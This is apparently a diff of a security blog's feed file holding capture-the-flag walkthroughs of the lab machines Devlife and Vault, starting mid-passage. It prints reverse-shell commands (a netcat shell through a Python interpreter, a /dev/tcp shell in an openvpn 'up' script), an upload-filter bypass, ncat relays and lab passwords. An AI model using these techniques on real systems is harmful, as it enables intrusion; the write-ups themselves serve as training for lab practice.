dav3gerous567 as the password (same credentials for DNS) and it worked. Decrypting root flag In the /home directory of dave on vault there’s a file called root.txt.gpg : Which is the root flag but gpg encrypted : We need a key to decrypt the flag , remember the key we saw earlier on ubuntu ? We will copy the file to ubuntu to decrypt it , Easiest way to do it is to base64 encode it then copy the base64 data and decode it on ubuntu. But base64 was not installed on vault so I used base32 instead : Now let’s decrypt it with the key : itscominghome : gpg -d root.txt.gpg And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Curling Next Hack The Box write-up : Hack The Box - RedCross</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/vault/0.png" /></entry><entry><title type="html">Wizard Labs - Devlife</title><link href="http://localhost:4000/wizard-labs/devlife/" rel="alternate" type="text/html" title="Wizard Labs - Devlife" /><published>2019-04-02T00:00:00+02:00</published><updated>2019-04-02T00:00:00+02:00</updated><id>http://localhost:4000/wizard-labs/devlife</id><content type="html" xml:base="http://localhost:4000/wizard-labs/devlife/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-this-is-my-write-up-about-devlife-from-wizard-labs-which-is-their-second-box-to-retire-just-like-dummy-its-another-easy-box-difficulty--210--its-a-linux-box-and-its-ip-is-101120-so-lets-jump-right-in-&quot;&gt;Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;dummy&lt;/a&gt; it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.1.1.20&lt;/code&gt; so let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;We will start with nmap to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC 10.1.1.20&lt;/code&gt;
-&lt;img src=&quot;/images/wizardlabs/devlife/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;only-2-ports-are-open--22-running-ssh-and-80-running-http-lets-check-http&quot;&gt;Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http.&lt;/h4&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;h4 id=&quot;on-the-main-page-we-get-this-about-me-message-and-nothing-else-&quot;&gt;On the main page we get this “About me” message and nothing else :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;About Me
-
-Hello , My name is Teddy Smith , I am a Python developer since 2007 !
-
-Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !!
-
-Stay Tuned ...
-
-TS
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got these results :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.htpasswd (Status: 403)
-/.htaccess (Status: 403)
-/.hta (Status: 403)
-/dev (Status: 301)
-/index.html (Status: 200)
-/manual (Status: 301)
-/server-status (Status: 403)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;getting-user&quot;&gt;Getting user&lt;/h3&gt;
-&lt;h4 id=&quot;so-i-checked-dev-and-found-this-online-python-27-interpreter-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;Online Python 2.7 Interpreter&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great--now-we-can-get-a-reverse-shell-in-many-ways--i-just-imported-os-then-did-ossystemreverse-shell-payload-&quot;&gt;Great , now we can get a reverse shell in many ways , I just imported &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; then did &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system(reverse shell payload)&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337')&lt;/code&gt;
-&lt;img src=&quot;/images/wizardlabs/devlife/4.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/wizardlabs/devlife/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;stored-root-credentials--privilege-escalation&quot;&gt;Stored root Credentials , Privilege Escalation&lt;/h3&gt;
-&lt;h4 id=&quot;in-the-home-directory-of-tedd-there-is-a-directory-called-env--lets-check-that&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;tedd&lt;/code&gt; there is a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;.env&lt;/code&gt; , Let’s check that.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/6.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/wizardlabs/devlife/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-notice-a-python-script-called-supy--which-runs-su-root-and-uses-the-password-to-authenticate-&quot;&gt;We notice a python script called &lt;code class=&quot;highlighter-rouge&quot;&gt;su.py&lt;/code&gt; , which runs &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; and uses the password to authenticate :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pexpect
-child = pexpect.spawn('su root')
-child.expect ('Password:')
-child.sendline('teddyxy2019')
-child.expect('\$')
-child.sendline('whoami')
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;now-we-can-su-to-root-using-the-password-teddyxy2019-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to root using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;teddyxy2019&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;h4 id=&quot;previous-wizard-labs-write-up--wizard-labs---dummy&quot;&gt;Previous Wizard Labs Write-up : &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;Wizard Labs - Dummy&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Python" /><summary type="html">Quick Summary Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like dummy it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is 10.1.1.20 so let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : nmap -sV -sT -sC 10.1.1.20 Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http. HTTP Initial Enumeration On the main page we get this “About me” message and nothing else : About Me Hello , My name is Teddy Smith , I am a Python developer since 2007 ! Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !! Stay Tuned ... TS I ran gobuster with /usr/share/wordlists/dirb/common.txt and got these results : /.htpasswd (Status: 403) /.htaccess (Status: 403) /.hta (Status: 403) /dev (Status: 301) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) Getting user So I checked /dev and found this Online Python 2.7 Interpreter : Great , now we can get a reverse shell in many ways , I just imported os then did os.system(reverse shell payload) : import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337') And we owned user ! Stored root Credentials , Privilege Escalation In the /home directory of tedd there is a directory called .env , Let’s check that. We notice a python script called su.py , which runs su root and uses the password to authenticate : import pexpect child = pexpect.spawn('su root') child.expect ('Password:') child.sendline('teddyxy2019') child.expect('\$') child.sendline('whoami') Now we can su to root using the password teddyxy2019 : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Wizard Labs Write-up : Wizard Labs - Dummy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/devlife/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Forensics" /><category term="ssh" /><category term="Networking" /><category term="Pivoting" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an openvpn config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is 10.10.10.109 I added it to /etc/hosts as vault.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC vault.htb Only two ports are open : 80 running http and 22 running ssh. As always we will check http. HTTP Initial Enumeration The main page is just displaying this message : Welcome to the Slowdaddy web interface We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe. We are proud to announce our first client: Sparklays (Sparklays.com still under construction) I ran gobuster but didn’t get anything , so I looked at the message again and noticed this line : We are proud to announce our first client: Sparklays (Sparklays.com still under construction). So I went to /sparklays and got a 403 response. So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 14:55:32 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin.php (Status: 200) /design (Status: 301) /admin.php sounds interesting. But in fact it’s useless. /admin.php : It asks for authentication , I tried test:test and got nothing. It didn’t print anything : And I also noticed that it’s sending the login data through GET parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time. /design : Design gave us a 403 response , I ran gobuster one more time and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/design/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 15:03:20 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /uploads (Status: 301) So I checked /uploads : And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions php and html and got a new result : design.html /design.html : There’s a link titled Change Logo which takes us to this upload page : Bypassing Restricted File Upload I created a small php script to get a reverse shell : And named it shell.php. Tried to upload and as expected , it told us that this file type is not allowed : We need to know what are the allowed file types , We will use Zap’s fuzzer and a file extenstions wordlist I got from seclists. Intercept the request –&amp;gt; right click –&amp;gt; attack –&amp;gt; Fuzzer By filtering the response body size we will notice that all the responses are 519 bytes except the response of .php5 which is 526 bytes. So it allows files with extension .php5 to be uploaded. Since the request has already been sent then the php shell is on the server now , Let’s excute it : There are two users on the box alex and dave , user flag is not on the box. On the desktop of dave there is a file called ssh which has ssh credentials : Now we can get an ssh connection as dave instead of this reverse shell as www-data dave : Dav3therav3123 : Escaping from ubuntu to DNS , openvpn reverse shell , Getting user Let’s take a look at the rest of the files on dave’s desktop : No idea what to do with that key itscominghome so we will leave it for now. The other file is Servers : We have another ip now : 192.168.122.5 , We need to scan it but unfortunately nmap is not on the box : Alternatively we will use nc to scan the first 100 ports like this : nc -zv 192.168.122.5 1-100 Port 80 is open and running http : Port 22 is open and running ssh : We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine : ssh -L 1234:192.168.122.4:80 dave@vault.htb Now we can go to http://localhost:1234 and access that http service : DNS configurator gives us a 404 response : Vpn configurator allows us to create an ovpn file and execute it : At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an ovpn file , and this article really helped. We are going to listen on the first host (ubuntu) and use the ovpn configurator to get a reverse shell on the second host (DNS) , We need to know the ip address of ubuntu on that subnet , ifconfig : ip : 192.168.122.1 Reverse shell payload : remote 192.168.122.1 dev tun nobind script-security 2 up &quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9898 0&amp;gt;&amp;amp;1'&quot; I used nobind because as you can see there’s a note saying that nobind must be used. Let’s update the file and click on Test VPN then check our listener : And we owned user ! SSH on DNS In the /home directory of dave on DNS there’s a file called ssh which has ssh credentials : So we can close that reverse shell and get an ssh connection on DNS as dave dave : dav3gerous567: But we had root on DNS , now we are dave. We want to get root again. sudo -l tells us that dave can use sudo on any command : So we can easily get root again by sudo su : Auth.log Enumeration By looking at Servers file again , which was on ubuntu We notice that there’s a host called The Vault and its ip is not there , so probably we need to get to that host , but we need its ip first. After a lot of enumeration I looked into auth.log and noticed that on the 2nd of September at 15:10:20 and 15:10:34 these commands were executed : Part of the log : Sep 2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0) Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root Sep 2 15:10:20 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:10:34 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root Commands : /usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 /usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 We have an ip (192.168.5.2) and we suspect that its the one we are looking for. I was using less to view the log so I searched for the ip to see if it was mentioned anywhere else :?192.168.5.2 , And I found it here too : Command : /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 On the same day at 15:07:51 That ip was scanned with nmap , and we notice --source-port=4444 , what’s that ? Source Port , Escaping from DNS to vault Let’s take that nmap command and run it again to see the results : Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan : nmap -Pn 192.168.5.2 Port 53 and 4444 , both of them are closed. weird … where is port 987 ? So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80. To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use ncat and make it listen on port 2222 , then the service running on that port will be another ncat connection from port 4444 to port 987 on 192.168.5.2 ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot; We will get another ssh connection to DNS , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately nmap can’t tell us because our connection is not direct. So I guessed common services and it was ssh : I tried dave as the username and dav3gerous567 as the password (same credentials for DNS) and it worked. Decrypting root flag In the /home directory of dave on vault there’s a file called root.txt.gpg : Which is the root flag but gpg encrypted : We need a key to decrypt the flag , remember the key we saw earlier on ubuntu ? We will copy the file to ubuntu to decrypt it , Easiest way to do it is to base64 encode it then copy the base64 data and decode it on ubuntu. But base64 was not installed on vault so I used base32 instead : Now let’s decrypt it with the key : itscominghome : gpg -d root.txt.gpg And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Curling Next Hack The Box write-up : Hack The Box - RedCross</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/vault/0.png" /></entry></feed>
